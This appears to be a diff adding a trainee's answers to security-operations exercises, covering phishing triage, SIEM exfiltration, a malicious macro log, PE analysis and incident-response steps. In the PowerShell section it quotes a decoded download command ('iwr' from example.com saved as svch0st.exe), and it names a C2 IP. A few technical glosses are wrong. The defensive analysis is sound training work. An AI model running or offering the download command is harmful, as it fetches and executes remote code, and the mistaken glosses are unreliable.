@@ -1,0 +1,225 @@
+This is a classic cold call marketing email. Appears to be advertising for an estimating service. 
+no links in either email (no phishing link). 
+the Sender is not addressing any specific user. (no spear phishing) 
+i do not see any social engineering techniques or tactics preying on Human emotion (Ther is no urgency, or authority)
+The Senders' domain appears to be from a Free Domain Registrar, could be spam but we should check the email header for the SPF and DKIM and DMARC records to verify the domain, and the Authenticity of the email. 
+ i believe this email is spam / unsolicited marketing and should be ignored. 
+
+
+
+
+
+ This email appears to be Spoofed as the senders Email does not match the sender Display name.
+This tells me that the SPF, DMARC, and DKIM could be bad and should be checked to verify authenticity. 
+There appears to be links embedded in the email. These should be checked with a Sandbox or a link preview to verify the validity of the links. i believe they are malicious. 
+if this email was unexpected and unsolicited that would also be a concern that raises red flags. 
+i also see no real Microsoft branding in the email, and it looks unprofessional. 
+I believe this email is malicious and should be ZAP'd / reported as Phishing.
+
+
+
+Oh look, its the email header i wanted to see from the last question. 
+
+mail is encrypted with AES256
+
+Immediately i see that the message is not signed by (no DKIM) the sender mx server, and the SPF failed, this tells me that PayPal did not send this message and the sending server is not approved to send emails on behalf of the PayPal mx domain. 
+
+We can use a tool called MXToolbox to look at all approved mail servers for the senders domain and verify validity of the email. 
+
+
+
+
+looking at this SIEM I can see host FINANCE-WKS01 has some unusual traffic compared to other devices. 
+I can see that Host FINANCE-WKS01 is sending a large amount of HTTPS (Port443) IP Traffic to an unknown destination as well as some HTTP (port 8080) to the same unknown destination.  
+I believe this SIEM is reporting an exfiltration of Data over Ip.  I would change the firewall rule to not allow any traffic to the unknown destination Ip address and report this concern to the appropriate chain of Command. 
+
+
+
+
+in the Clicked_url, the link is over HTTP which is not secure. The Clicked link also does not appear to be related to the legit PayPal domain and is misspelled.
+The Final URL does not appear to be related to the PayPal and this connection is over HTTPS. 
+This event looks to be a Man in the Middle attack (AiTM) derived from a malicious link.
+
+
+
+
+
+analyzing this log i can see immediately that a weaponized Excel Document is opened and Code is executed. (likely excel Macros)
+The malicious code opened PowerShell and connected back to the C2C (185.44.92.17:443).
+Access to LSASS (credential hashes) was attempted and was blocked by the EDR. (yay for the EDR!) 
+The registry was changed to allow persistence on the infected machine. 
+This attack contained no External Tools (living of the land)
+
+
+
+
+
+
+The EDR blocked to Exfiltration of the LSASS Hashes, but post exploitation was still performed on the registry to contain persistence. 
+
+This machine is compromised and should be isolated and re-imaged or Sandboxed for further analysis. 
+
+
+
+
+The attempted access of the LSASS hashes is the most critical escalation indicator because
+this would allow an attacker to potentially gain escalated access to the machine and could move laterally to other devices. 
+
+
+
+
+
+
+1. inform Chain of Command (reporting to Incident Response Team)
+2.Isolate the Device (do not Power off or we could lose Logs, IoC's and artifacts)
+3. Scan for all modified registries and changed files using tools such as RegMon.
+4. Report Findings
+5. Remediate by acting upon the agreed Resolution steps. (re-image, or Submit for further analysis.)
+6. meet to review lessons learned.
+
+
+
+
+
+
+
+
+
+
+This Document does appear malicious.    
+
+The biggest indicator is that "SECURITY WARNING: Micros are Disabled" banner and then Document telling us to enable those Macros (enable editing and content). 
+
+Enabling macros allows the execution of Code on the local machine. This Document is trying to trick using to allowing the execution of this malicious code. 
+
+This Document also look super old for the current version of work that appears in the Screenshot. 
+
+The naming convention of this Document also looks suspicious. 
+
+we can analyze this document Further by Sandboxing the Document and executing the Macros to look for changes (Again with Regmon or procmon)  or we can look at the macro Code and understand how it behaves. 
+
+
+
+
+
+
+
+
+
+Looking at the ASCii character on the Right, the first 2 characters tell me that this is a MZ File (4D 5A = MZ(.exe or .DOS)) which tells windows that this is an executable file. (We can verify this by researching legit Document Headers and comparing the two.  (for example: 50 4B 03 04 = PK (ZIP file)) 
+
+on the last ASCii row we can see "PE' telling us that this portable executable.  
+
+I believe this could be a malicious executable being masqueraded as a legit document.
+
+
+
+
+
+
+
+Describe the output:  This appears to be an executable loaded into PEstudio (the tool used in the screenshot)
+
+Analyzing the exe we can see that there is no LegalCopyRight (signature) on the file. This raises Red Flags.
+
+The language looks to be 0x000 (this removes dependencies) 
+
+The name "Ovidiy" is shown in short hand and does not match what professional vendor would list. 
+
+i believe this could have been introduced onto the host from a legit but compromised webpage / Download page.  or a user could have been hit a phishing email with an exe masquerading as something else. 
+
+
+
+
+
+
+Running this Ip throught a trusted vendor such as VirusTotal give us the following report. 
+
+103.20.195.242
+(103.20.192.0/22)
+AS 135357
+( HONG KONG KOWLOON TELECOMMUNICATIONS CO.,LIMITED )
+
+We also receive the Registration Data (RDAP) and the whois lookup information (not listed for omitted output) 
+
+it appears the Whois Data for this domain is not masqueraded by the Domain registrar and is fully visible to passive recon.
+
+
+
+
+
+
+
+
+
+
+we can see this Command is partially encoded in Base64 we can use tools such as base64decode.org. to decode it easily. 
+
+the encoded PowerShell command tells us someone is trying to use obfuscation to hide the malicious command. 
+
+now decoded we have -
+"powershell.exe -nop -ep bypass -command "iwr https://example.com/r/MD5892/0" > %temp%\svch0st.exe."
+
+now we can analyze it.  
+
+This command evokes PowerShell with the -nop command (no user) and the bypass command (execution Bypass policy)
+
+iwr = Get-webrequest. This tells us that this PowerShell command is trying to potentially download something, Connect to a c2c, or Call-to-Home. 
+
+We can also see that the target scvh0st.exe file is being masqueraded as a system file. the misspelling of the file name tells us this file is trying to hide from us. lots of red flags here. 
+
+This attack looks to be part of the initial access and persistence phase of the story. 
+
+my next steps would be to report the concern to incident response team, block the attackers "https://example.com" Domain, and verify that the EDR is Blocking the PowerShell command. 
+
+
+
+
+
+
+
+
+i would prioritize based off of most dangerous. 4, 3, 2, 1
+
+1. Contain and isolate the machine sending C2's call to home. Alert Incident Response Team.
+2. Investigate CISO Report for expected indicators.
+3. Triage source of brute Force attempts (block ip/domain, isolate target machine)
+4. investigate phishing email. 
+
+
+
+i based my priorities on the impact that the concern could have.  
+
+
+
+I'm alerted to an incident (could be from a Firewall, or EDR alert or user informing me) 
+
+I ask a few probing questions (either to the user or i look through the EDR Logs to triage and prioritize the Incident.)  
+
+I alert the incident Response Team
+
+I triage the alerts and affect Devices apparently, according to the severity of the concern. 
+
+We review lessons learned and understood how we can prevent this in the future. 
+
+
+
+
+
+
+This is Caesar Cipher Encoded by moving characters 13 positions to the Right. and represents "With great power comes great responsibility" in ASCii. 
+This was found by using a Caesar Cipher Decoder Online. 
+
+
+
+
+This appears to be Shell Code. We can research this deeply to understand the output of each Hex can play apart in this string. This cannot be converted in to traditional ASCii. 
+
+
+
+(?i)(?:@|://|=)(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)
+
+
+
+This command has some hidden powershell flags in it, so its trying to be stealthy while executing this code. 
+The Code appears to be compressed and encoded un UTF-16LE. This malicious Code also execute in memory and never touches the machine disk. The decoded command shows us the IEX command executes and decompresses the code automatically
